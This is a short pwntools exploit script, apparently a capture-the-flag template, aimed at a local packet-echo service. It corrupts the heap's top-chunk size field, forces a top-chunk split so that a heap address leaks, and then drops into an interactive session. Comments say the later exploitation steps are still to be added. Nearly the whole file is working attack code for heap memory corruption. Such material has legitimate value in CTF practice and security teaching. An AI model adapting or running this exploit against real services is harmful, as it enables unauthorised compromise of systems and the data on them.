#!/usr/bin/env python3
from pwn import *
import os

context.log_level = "info"

HOST = os.environ.get("HOST", "127.0.0.1")
PORT = int(os.environ.get("PORT", "31344"))

def send_echo(sock, content, sz):
    sock.recvuntil(b"PKT_RES")
    sock.send(p64(sz))  # 8-byte size_t
    if len(content) != 0:
        payload = p64(1) + content  # option=1 (ECHO), then data
    else:
        payload = p64(1)  # just option=1
    sock.sendline(payload)

def send_raw(sock, content, sz):
    sock.recvuntil(b"PKT_RES")
    sock.send(p64(sz))
    sock.sendline(content)

def main():
    s = remote(HOST, PORT)
    
    # Example basic interaction - adapt based on your libc version and offsets
    # This is a template; you'll need to adjust for your specific environment
    
    # Step 1: Try to get heap leak via top chunk manipulation
    send_echo(s, b"", 0x10)
    send_echo(s, b"a"*8 + p64(0xd31), 0x10)  # corrupt top chunk size
    send_echo(s, b"b"*0xf00, 0x1000)  # trigger top chunk split
    send_echo(s, b"", 0x8)
    
    try:
        s.recvuntil(b":[")
        leak_data = s.recv(8)
        if len(leak_data) >= 6:
            leak = u64(leak_data[:6] + b"\0\0")
            log.info(f"Potential heap leak: {hex(leak)}")
    except:
        log.warning("Basic leak attempt failed, may need adjustment")
    
    # Continue with your exploitation strategy...
    # This template provides the communication framework
    
    s.interactive()

if __name__ == "__main__":
    main()